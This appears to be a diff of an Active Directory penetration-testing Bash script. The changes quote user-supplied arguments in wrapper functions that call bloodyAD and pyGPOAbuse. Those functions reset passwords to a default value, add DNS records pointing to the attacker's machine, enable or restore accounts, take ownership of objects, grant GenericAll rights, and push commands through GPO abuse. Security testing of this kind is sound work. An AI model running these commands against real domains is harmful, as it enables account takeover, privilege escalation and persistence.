@@ -3808,7 +3808,7 @@ change_pass() {
             read -rp ">> " pass_passchange </dev/tty
             if [[ ${pass_passchange} == "" ]]; then pass_passchange="Summer3000_"; fi
             echo -e "${CYAN}[*] Changing password of ${target_passchange} to ${pass_passchange}${NC}"
-            run_command "${bloodyad} ${argument_bloodyad} ${ldaps_param} --host ${dc_FQDN} --dc-ip ${dc_ip} set password ${target_passchange} ${pass_passchange}" 2>&1 | tee -a "${Modification_dir}/bloodyAD_${user_var}/bloodyad_out_passchange_${dc_domain}.txt"
+            run_command "${bloodyad} ${argument_bloodyad} ${ldaps_param} --host ${dc_FQDN} --dc-ip ${dc_ip} set password '${target_passchange}' '${pass_passchange}'" 2>&1 | tee -a "${Modification_dir}/bloodyAD_${user_var}/bloodyad_out_passchange_${dc_domain}.txt"
         fi
     fi
     echo -e ""
@@ -3937,7 +3937,7 @@ dnsentry_add() {
             echo -e "${BLUE}[*] Please confirm the IP of the attacker's machine:${NC}"
             set_attackerIP
             echo -e "${BLUE}[*] Adding new DNS entry ${hostname_dnstool} with IP ${attacker_IP} for Active Directory integrated DNS${NC}"
-            run_command "${bloodyad} ${argument_bloodyad} ${ldaps_param} --host ${dc_FQDN} --dc-ip ${dc_ip} --dns ${dns_ip} add dnsRecord ${hostname_dnstool} ${attacker_IP}" | tee -a "${Modification_dir}//bloodyAD_${user_var}/bloodyad_dns_add_${dc_domain}.txt"
+            run_command "${bloodyad} ${argument_bloodyad} ${ldaps_param} --host ${dc_FQDN} --dc-ip ${dc_ip} --dns ${dns_ip} add dnsRecord '${hostname_dnstool}' '${attacker_IP}'" | tee -a "${Modification_dir}//bloodyAD_${user_var}/bloodyad_dns_add_${dc_domain}.txt"
         fi
     fi
     echo -e ""
@@ -3964,7 +3964,7 @@ dnsentry_remove() {
                 read -rp ">> " dns_remove_IP </dev/tty
             done
             echo -e "${BLUE}[*] Removing DNS entry ${hostname_dnstool} with IP ${dns_remove_IP} for Active Directory integrated DNS${NC}"
-            run_command "${bloodyad} ${argument_bloodyad} ${ldaps_param} --host ${dc_FQDN} --dc-ip ${dc_ip} --dns ${dns_ip} remove dnsRecord ${hostname_dnstool} ${dns_remove_IP}" | tee -a "${Modification_dir}/bloodyAD_${user_var}/bloodyad_dns_remove_${dc_domain}.txt"
+            run_command "${bloodyad} ${argument_bloodyad} ${ldaps_param} --host ${dc_FQDN} --dc-ip ${dc_ip} --dns ${dns_ip} remove dnsRecord '${hostname_dnstool}' '${dns_remove_IP}'" | tee -a "${Modification_dir}/bloodyAD_${user_var}/bloodyad_dns_remove_${dc_domain}.txt"
         fi
     fi
     echo -e ""
@@ -3988,7 +3988,7 @@ enable_account() {
                 read -rp ">> " account_enable </dev/tty
             done
             echo -e "${BLUE}[*] Enabling account ${account_enable}${NC}"
-            run_command "${bloodyad} ${argument_bloodyad} ${ldaps_param} --host ${dc_FQDN} --dc-ip ${dc_ip} -f rc4 remove uac ${account_enable} -f ACCOUNTDISABLE" | tee -a "${Modification_dir}/bloodyAD_${user_var}/bloodyad_enable_${dc_domain}.txt"
+            run_command "${bloodyad} ${argument_bloodyad} ${ldaps_param} --host ${dc_FQDN} --dc-ip ${dc_ip} -f rc4 remove uac '${account_enable}' -f ACCOUNTDISABLE" | tee -a "${Modification_dir}/bloodyAD_${user_var}/bloodyad_enable_${dc_domain}.txt"
         fi
     fi
     echo -e ""
@@ -4012,7 +4012,7 @@ disable_account() {
                 read -rp ">> " account_disable </dev/tty
             done
             echo -e "${BLUE}[*] Disabling account ${account_disable}${NC}"
-            run_command "${bloodyad} ${argument_bloodyad} ${ldaps_param} --host ${dc_FQDN} --dc-ip ${dc_ip} -f rc4 add uac ${account_disable} -f ACCOUNTDISABLE" | tee -a "${Modification_dir}/bloodyAD_${user_var}/bloodyad_disable_${dc_domain}.txt"
+            run_command "${bloodyad} ${argument_bloodyad} ${ldaps_param} --host ${dc_FQDN} --dc-ip ${dc_ip} -f rc4 add uac '${account_disable}' -f ACCOUNTDISABLE" | tee -a "${Modification_dir}/bloodyAD_${user_var}/bloodyad_disable_${dc_domain}.txt"
         fi
     fi
     echo -e ""
@@ -4036,7 +4036,7 @@ restore_account() {
                 read -rp ">> " account_restore </dev/tty
             done
             echo -e "${BLUE}[*] Restoring account ${account_restore}${NC}"
-            run_command "${bloodyad} ${argument_bloodyad} ${ldaps_param} --host ${dc_FQDN} --dc-ip ${dc_ip} set restore ${account_restore}" | tee -a "${Modification_dir}/bloodyAD_${user_var}/bloodyad_restore_${dc_domain}.txt"
+            run_command "${bloodyad} ${argument_bloodyad} ${ldaps_param} --host ${dc_FQDN} --dc-ip ${dc_ip} set restore '${account_restore}'" | tee -a "${Modification_dir}/bloodyAD_${user_var}/bloodyad_restore_${dc_domain}.txt"
         fi
     fi
     echo -e ""
@@ -4061,7 +4061,7 @@ change_owner() {
                 read -rp ">> " target_ownerchange </dev/tty
             done
             echo -e "${CYAN}[*] Changing Owner of ${target_ownerchange} to ${user}${NC}"
-            run_command "${bloodyad} ${argument_bloodyad} ${ldaps_param} --host ${dc_FQDN} --dc-ip ${dc_ip} set owner ${target_ownerchange} '${user}'" 2>&1 | tee -a "${Modification_dir}/bloodyAD_${user_var}/bloodyad_out_ownerchange_${dc_domain}.txt"
+            run_command "${bloodyad} ${argument_bloodyad} ${ldaps_param} --host ${dc_FQDN} --dc-ip ${dc_ip} set owner '${target_ownerchange}' '${user}'" 2>&1 | tee -a "${Modification_dir}/bloodyAD_${user_var}/bloodyad_out_ownerchange_${dc_domain}.txt"
         fi
     fi
     echo -e ""
@@ -4085,7 +4085,7 @@ add_genericall() {
                 read -rp ">> " target_genericall </dev/tty
             done
             echo -e "${CYAN}[*] Adding GenericAll rights on ${target_genericall} to ${user}${NC}"
-            run_command "${bloodyad} ${argument_bloodyad} ${ldaps_param} --host ${dc_FQDN} --dc-ip ${dc_ip} add genericAll ${target_genericall} '${user}'" 2>&1 | tee -a "${Modification_dir}/bloodyAD_${user_var}/bloodyad_out_genericall_${dc_domain}.txt"
+            run_command "${bloodyad} ${argument_bloodyad} ${ldaps_param} --host ${dc_FQDN} --dc-ip ${dc_ip} add genericAll '${target_genericall}' '${user}'" 2>&1 | tee -a "${Modification_dir}/bloodyAD_${user_var}/bloodyad_out_genericall_${dc_domain}.txt"
         fi
     fi
     echo -e ""
@@ -4343,7 +4343,7 @@ pygpo_abuse() {
         read -rp ">> " command_input_gpoabuse </dev/tty
         if [ ! "${command_input_gpoabuse}" == "" ]; then command_gpoabuse="-command ${command_input_gpoabuse}"; fi
         if [ "${ldaps_bool}" == true ]; then ldaps_param="-ldaps"; else ldaps_param=""; fi
-        run_command "${python3} ${pygpoabuse} ${argument_pygpoabuse} ${ldaps_param} -dc-ip ${dc_ip} -gpo-id ${target_gpoabuse} ${userbool_gpoabuse} ${command_gpoabuse}" 2>&1 | tee -a "${Modification_dir}/pygpoabuse_output_${user_var}.txt"
+        run_command "${python3} ${pygpoabuse} ${argument_pygpoabuse} ${ldaps_param} -dc-ip ${dc_ip} -gpo-id '${target_gpoabuse}' '${userbool_gpoabuse}' ${command_gpoabuse}" 2>&1 | tee -a "${Modification_dir}/pygpoabuse_output_${user_var}.txt"
     fi
     echo -e ""
 }
